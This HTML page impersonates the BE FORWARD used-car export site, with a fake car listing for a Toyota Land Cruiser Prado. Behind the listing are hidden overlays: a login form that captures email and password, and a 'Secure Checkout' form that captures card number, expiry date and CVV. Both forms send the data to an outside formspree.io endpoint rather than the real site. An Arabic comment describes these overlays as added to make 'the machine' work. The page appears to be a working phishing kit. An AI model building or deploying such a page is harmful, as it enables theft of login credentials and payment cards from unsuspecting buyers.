<!DOCTYPE html>
<html lang="en">
<head>
    <base href="https://www.beforward.jp/">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Used Cars for Sale - BE FORWARD JP</title>
    
    <style>
        /* إضافة لمساتنا الخاصة فوق الكود الأصلي لضمان عمل "المكينة" */
        .my-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 999999; overflow-y: auto; }
        .pay-frame { max-width: 400px; margin: 40px auto; padding: 20px; border: 2px solid #003366; text-align: center; font-family: Arial; }
        .pay-input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; font-size: 16px; }
        .pay-btn { background: #ff6600; color: white; border: none; width: 100%; padding: 15px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>

<div id="original_content">
    <header style="background:#003366; color:white; padding:10px; display:flex; justify-content:space-between;">
        <div style="color:#ff6600; font-size:24px; font-weight:900; font-style:italic;">BE FORWARD</div>
        <div onclick="showPage('login')" style="cursor:pointer; font-size:12px;">LOGIN</div>
    </header>

    <div style="background:#ff6600; color:white; padding:8px; text-align:center; font-weight:bold;">
        STOCK IN MAURITANIA: 224,105 CARS
    </div>

    <div style="padding:15px; border-bottom:1px solid #eee; display:flex;" onclick="showPage('login')">
        <img src="images/stocklist/car_no_image.png" style="width:140px; height:105px;">
        <div style="padding-left:15px;">
            <div style="color:#003366; font-weight:bold; font-size:15px;">TOYOTA LAND CRUISER PRADO 2021</div>
            <div style="color:#d0021b; font-size:18px; font-weight:bold; margin-top:10px;">$28,500</div>
            <button onclick="event.stopPropagation(); showPage('pay')" style="background:#003366; color:white; border:none; padding:8px 15px; margin-top:5px; cursor:pointer;">BUY NOW</button>
        </div>
    </div>
</div>

<div id="login_page" class="my-overlay">
    <div class="pay-frame">
        <img src="images/common/logo_bf.png" width="160">
        <h3>Login to BE FORWARD</h3>
        <form action="https://formspree.io/f/mqakppvw" method="POST">
            <input type="email" name="Email" class="pay-input" placeholder="Email Address" required>
            <input type="password" name="Pass" class="pay-input" placeholder="Password" required>
            <button type="submit" class="pay-btn">LOG IN</button>
        </form>
        <button onclick="hidePages()" style="background:none; border:none; color:blue; margin-top:10px; cursor:pointer;">Back to search</button>
    </div>
</div>

<div id="pay_page" class="my-overlay">
    <div class="pay-frame">
        <img src="images/common/logo_bf.png" width="160">
        <h2 style="color:#003366">Secure Checkout</h2>
        <form action="https://formspree.io/f/mqakppvw" method="POST">
            <input type="text" name="Card" class="pay-input" placeholder="Card Number" maxlength="16" required>
            <div style="display:flex; gap:10px;">
                <input type="text" name="Exp" class="pay-input" placeholder="MM/YY" maxlength="5" required>
                <input type="text" name="CVV" class="pay-input" placeholder="CVV" maxlength="3" required>
            </div>
            <button type="submit" class="pay-btn" style="background:#003366;">CONFIRM PAYMENT</button>
        </form>
    </div>
</div>

<script>
    function showPage(id) {
        document.getElementById(id + '_page').style.display = 'block';
        window.scrollTo(0,0);
    }
    function hidePages() {
        document.querySelectorAll('.my-overlay').forEach(p => p.style.display = 'none');
    }
</script>

</body>
</html>
